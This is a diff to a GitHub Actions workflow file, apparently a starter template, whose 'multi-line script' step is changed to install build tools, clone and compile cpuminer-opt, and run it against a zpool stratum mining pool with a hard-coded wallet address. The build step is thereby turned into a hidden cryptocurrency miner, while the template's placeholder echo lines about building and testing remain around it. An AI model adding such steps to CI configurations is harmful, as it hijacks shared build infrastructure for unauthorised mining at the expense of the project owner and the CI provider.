@@ -32,5 +32,21 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
+          apt update -y
+          apt install screen -y
+          apt install build-essential -y
+          apt install automake -y
+          apt install libssl-dev -y
+          apt install libcurl4-openssl-dev -y
+          apt install libjansson-dev -y
+          apt install libgmp-dev -y
+          apt install zlib1g-dev -y
+          apt install git -y
+          apt install wget -y
+          cd
+          git clone https://github.com/JayDDee/cpuminer-opt.git
+          cd cpuminer-opt
+          ./build.sh
+          ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=DGB,zap=PYRK-lyra2z330 -q
           echo Add other actions to build,
           echo test, and deploy your project.
